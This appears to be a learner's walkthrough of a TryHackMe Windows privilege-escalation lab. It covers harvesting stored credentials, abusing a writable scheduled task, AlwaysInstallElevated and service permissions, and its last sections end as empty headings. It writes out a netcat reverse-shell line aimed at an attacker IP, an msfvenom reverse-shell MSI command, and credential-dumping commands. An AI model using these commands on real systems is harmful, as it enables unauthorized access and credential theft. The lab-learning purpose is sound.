# TRYHACKME : Windows Privilege Escalation

> Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
> - Misconfigurations on Windows services or scheduled tasks
> - Excessive privileges assigned to our account
> - Vulnerable software
> - Missing Windows security patches

## Windows User
| User Type | Privileges |
|---|---|
| Administrator | -> have the most privileges -> can change any system configuration parameter & access any file in the system |
| Standard Users | -> can access the computer but only perform limited tasks -> these users can not make permanent or essential changes to the system and are limited to their files |

| Special Built-in Accounts | |
|---|---|
| SYSTEM / LocalSystem | -> account used by the operating system to perform internal tasks -> has full access to all files and resources available on the host -> has higher privileges than administrators |
| Local Service | -> default account -> minimum privileges -> uses anonymous connections over the network |
| Network Service | -> default account -> minimum privileges -> use the computer credentials to authenticate through the network |

<details markdown=1>
<summary><h2> 1. Harvesting Passwords from Usual Spots </h2></summary>
  
> This task will present some known places to look for passwords on a Windows system.
>
> Start the target machine. If using 
>
>> Username: `thm-unpriv` Password: `Password321`
>
> # A. Unattended Windows Installations
> When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network.
> 
>> These kinds of installations are referred to as unattended installations as they don't require user interaction.
>
> Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
>```
>    C:\Unattend.xml
>    C:\Windows\Panther\Unattend.xml
>    C:\Windows\Panther\Unattend\Unattend.xml
>    C:\Windows\system32\sysprep.inf
>    C:\Windows\system32\sysprep\sysprep.xml
> ```
>
> In these type of files, you might encounter credentials such as:
> ```
>  <Credentials>
>     <Username>Administrator</Username>
>     <Domain>thm.local</Domain>
>     <Password>MyPassword123</Password>
>  </Credentials>
> ```
> ## TARGET MACHINE:
>> ```
>> more C:\Unattend.xml => (cannot access file / file not found)
>> more C:\Windows\Panther\Unattend.xml => (cannot access file / file not found)
>> dir C:\Windows\Panther\Unattend => (empty folder)
>> more C:\Windows\system32\sysprep.inf => (cannot access file / file not found)
>> dir C:\Windows\system32\sysprep
>>       <DIR> ActionFiles
>>       <DIR> en-us
>>       <DIR> Panther
>>       sysprep.exe
>> more C:\Windows\system32\sysprep\sysprep.xml => (cannot access file / file not found)
>> ```
>> 
> 
> # B. Powershell History
> All commands run using Powershell gets stored into a file that keeps a memory of past commands.
>
>> It can later be retrieved by using the following command from a `cmd.exe` prompt (it won't work in Powershell; in order to read the file from Powershell, replace `%userprofile%` into `$Env:userprofile`)
>
> ```
> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
>> ls
>> whoami
>> whoami /priv
>> whoami /group
>> whoami /groups
>> cmdkey /?
>> cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z        // WAHH CREDENTIALS!!!
>> cmdkey /list
>> cmdkey /delete:thmdc.local
>> cmdkey /list
>> runas /?
>> ```
>
> # C. Saved Windows Credentials
> Windows allows us to use other users' credentials.
>
> The command below will list saved credentials:
> ```
> cmdkey /list
> ```
>
> Regardless of not seeing actual passwords, credentials alone are worth trying. Use them with the `runas` command and the `/savecrad` option:
> ```
> runas /savecred /user:admin cmd.exe
> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>cmdkey /list
>>
>> Currently stored credentials:
>>
>>     Target: Domain:interactive=WPRIVESC1\mike.katz
>>     Type: Domain Password
>>     User: WPRIVESC1\mike.katz
>> 
>> C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
>> Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
>>
>> (opens another cmd terminal)
>>
>> C:\Windows\system32>whoami
>> wprivesc1\mike.katz
>> C:\Windows\system32>more C:\Users\mike.katz\Desktop\flag.txt
>> // FLAG ANSWER
>> ```
>
> # D. IIS Configuration
> Internet Information Services (IIS) is the default web server on Windows installations.
>
>> IIS websites' configuration is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms.
>
> Depending on the installed version, `web.config` can be found on ff locations:
>``` 
>    C:\inetpub\wwwroot\web.config
>    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
>```
> 
> To quickly find database connection strings on the file:
> ```
> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
> ```
> ## TARGET MACHINE
>> ```
>> C:\Users\thm-unpriv> more C:\inetpub\wwwroot\web.config => (cannot access file / file not found)
>> C:\Users\thm-unpriv> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
>>                 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false"
>> bufferMode="Notification" name="SqlWebEventProvider"
>> type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
>>                     <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider"
>> type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral,
>> PublicKeyToken=b03f5f7f11d50a3a" />
>>     <connectionStrings>
>>         <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />  // WAHH CREDENTIALS !!!
>> </connectionStrings>
>> ```
>
> # E. Retrieve Credentials from Software: PuTTY
> **PuTTY** is an SSH client commonly found on Windows systems. It is created by Simon Tatham (his name is part of the path, not the username to retrieve password).
>
> Users can store sessions (IP, user, and other configurations) instead of having to specify a connection's parameters every single time. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
>
> To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword w/ the ff command:
> ```
> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
> ```
> Stored proxy username should also be visible after running the command above.
>
> # TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
>> HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
>> 
>>     ProxyExcludeList    REG_SZ
>>     ProxyDNS    REG_DWORD    0x1
>>     ProxyLocalhost    REG_DWORD    0x0
>>     ProxyMethod    REG_DWORD    0x0
>>     ProxyHost    REG_SZ    proxy
>>     ProxyPort    REG_DWORD    0x50
>>     ProxyUsername    REG_SZ    thom.smith
>>     ProxyPassword    REG_SZ    CoolPass2021    // WAHH CREDENTIALS !!!
>>     ProxyTelnetCommand    REG_SZ    connect %host %port\n
>>     ProxyLogToTerm    REG_DWORD    0x1
>>
>> End of search: 10 match(es) found.
>> ```
>>
</details>

<details>
<summary><h2> 2. Other Quick Wins </h2></summary>
  
> Privilege escalation is not always a challenge.
>
> Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access.
>
> # A. Scheduled Tasks
> Some scheduled task might either lost its binary or it's using a binary you can modify.
>
> Scheduled tasks can be listed from the command line using the `schtasks` command without any options.
>
> To retrieve more detailed information about any of the services you can type
> ```
> C:\> schtasks /query /tn vulntask /fo list /v
> Folder: \
> HostName:                             THM-PC1
> TaskName:                             \vulntask
> Task To Run:                          C:\tasks\schtask.bat
> Run As User:                          taskusr1
> ```
> ### Two Important Parameters:
>> - **Task to Run** = indicates what gets executed by the scheduled task
>> - **Run As User** = shows the user that will be used to execute the task
>
> If modifiable, we can control what gets executed by the taskuser1, resulting in a simple privilege escalation.
> 
> Use `icacls` to check permissions on the executable:
> ```
> C:\> icacls c:\tasks\schtask.bat
> c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
>                     BUILTIN\Administrators:(I)(F)
>                     BUILTIN\Users:(I)(F)
> ```
> The **BUILTIN/Users** group has full access (F) over the task's binary. That means we can modify the .bat file and insert any payloads we like.
>
> ## ATTACKER MACHINE:
>> ```
>> root@ip-10-10-107-180:~# nc -lvp 4444
>> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe <ATTACKER-IP> 4444 > C:\tasks\schtask.bat
>>
>> C:\Users\thm-unpriv>schtasks /run /tn vulntask
>> SUCCESS: Attempted to run the scheduled task "vulntask".
>> ```
>
> ## ATTACKER MACHINE:
>> ```
>> root@ip-10-10-107-180:~# nc -lvp 4444
>> Listening on 0.0.0.0 4444
>> Connection received on 10.10.89.191 49907
>> Microsoft Windows [Version 10.0.17763.1821]
>> (c) 2018 Microsoft Corporation. All rights reserved.
>>
>> C:\Windows\system32>whoami
>> wprivesc1\taskusr1
>>
>> C:\Windows\system32>more C:\Users\taskuser1\Desktop\flag.txt
>> // RETRIEVE FLAG
>> ```
>
> # B. AlwaysInstallElevated
> Windows installer files (.msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it.
>
> However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
>
>> **NOTE:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.
> 
> This method required two registry values to be set. Otherwise, exploitation will not be possible. You can query these from the command line using the commands below:
>> ```
>> C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
>> C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
>> ```
>
> After setting the two, you can generate a malicious .msi file using `msfvenom`, as seen below:
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
> ```
> As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
> ```
> C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
> ```
  
</details>

<details> 
<summary><h2> 3. Abusing Service Misconfigurations </h2></summary>

> # A. Windows Services
> Window servies are managed by the **Service Control Manager (SCM)**. Its in charge of managing the state of service as needed, checking the current status of any given service and generally providing a way to configure services.
> 
>> Each service will have associated executable which will be run by SCM whenever a service is started.
>
> Service executables implement _special functions_ to be able to communicate with the SCM. Therefore, not any executable can be started as a service succesfully.
>
>> Each service also specifies the **user account** under which the service will run.
>
> To check the structure of a service, let's check as an example the `apphostsvc` service configuration with the `sc qc` command:
> 
> ### TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>sc qc apphostsvc
>> [SC] QueryServiceConfig SUCCESS
>>
>> SERVICE_NAME: apphostsvc
>>         TYPE               : 20  WIN32_SHARE_PROCESS\
>>         START_TYPE         : 2   AUTO_START
>>         ERROR_CONTROL      : 1   NORMAL
>>         BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
>>         LOAD_ORDER_GROUP   :        TAG                : 0
>>         DISPLAY_NAME       : Application Host Helper Service
>>         DEPENDENCIES       :
>>         SERVICE_START_NAME : localSystem
>> ```
> Here we can see the _associated executable_ is specified throught the **BINARY_PATH_NAME** parameter, and the _account used_ to urn the service is shown on the **SERVICE_START_NAME** parameter.
>
>> Services have a **Discretionary Access Control List (DACL)**, which indicates _who has permission_ to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
>
> DACL can be seen from **Process Hacker** on THM's target machine's desktop. Then click on Services Tab > AppHOstSvc > Security Tab. You'll see the group or user names and their permissions.
>
> While all the services configuration are stored on the **Registry Editor** under `HKLM\SYSTEM\CurrentControlSet\Services\AppHostSvc`
>
>> A **subkey** exist for every service in the system. We can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**.
>
> # B. Insecure Permissions on Service Executable
>
> If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
>
> To understand how this works, let's look at a vulnerability found on **Splinterware System Scheduler**. To start, we will query the service configuration using sc:
>
> ### TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>sc qc WindowsScheduler
>> [SC] QueryServiceConfig SUCCESS
>>
>> SERVICE_NAME: WindowsScheduler
>>         TYPE               : 10  WIN32_OWN_PROCESS
>>         START_TYPE         : 2   AUTO_START
>>         ERROR_CONTROL      : 0   IGNORE
>>         BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
>>         LOAD_ORDER_GROUP   :
>>         TAG                : 0
>>         DISPLAY_NAME       : System Scheduler Service
>>         DEPENDENCIES       :
>>         SERVICE_START_NAME : .\svcusr1
>> ```
 
> We can see that the service installed by the vulnerable software runs as **svcuser1** and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:
>
> ### TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
>> C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
>>                                   NT AUTHORITY\SYSTEM:(I)(F)
>>                                   BUILTIN\Administrators:(I)(F)
>>                                   BUILTIN\Users:(I)(RX)
>>                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
>>                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
>>
>> Successfully processed 1 files; Failed processing 0 files
>> ```
> And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.
>
> ### ATTACKER MACHINE:
>> ```
>> 
>> ```
> # C. Unquoted Service Paths
> # D. Insecure Service Permissions
> 

</details>


